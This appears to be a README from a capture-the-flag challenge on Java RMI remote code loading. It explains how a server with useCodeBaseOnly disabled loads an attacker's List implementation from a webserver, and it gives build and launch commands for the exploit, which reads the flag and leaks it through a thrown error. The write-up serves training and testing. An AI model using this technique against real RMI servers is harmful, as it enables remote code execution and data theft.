This challenge is based on Java allowing remote code execution in an RMI server if java.rmi.server.useCodeBaseOnly is set
to false on the server (it fortunately defaults to true for JRE relased after 2013-04-16). The remote code execution is
made worse by a very permissive (mandatory) policy set on the server side.

Together with the challenge are given:
* an url pointing to the server codebase (doesn't need to be actually used), from where the user can download AverageService.class.
* the url of the rmi registry

upon decompiling it with IntelliJ, the client can built its own RMI client for the service, and pass to the remote method
a custom implementation of List<Integer> that can read the flag and exfiltrate it throwing Error(flag);

The exploit is in src/client and can be compiled as `gradle clientClasses`
additionally the attacker has to make his implementation of the List accessible on a webserver

the client also has to be launched with the systemProperty java.rmi.server.codebase=http://webserver:host/

How to test the exploit:
```
gradle clientClasses
cd build/classes/client
python -m http.server 9000 &
java -Djava.rmi.server.codebase=http://localhost:9000/ it.polictf.lamermi.Client
```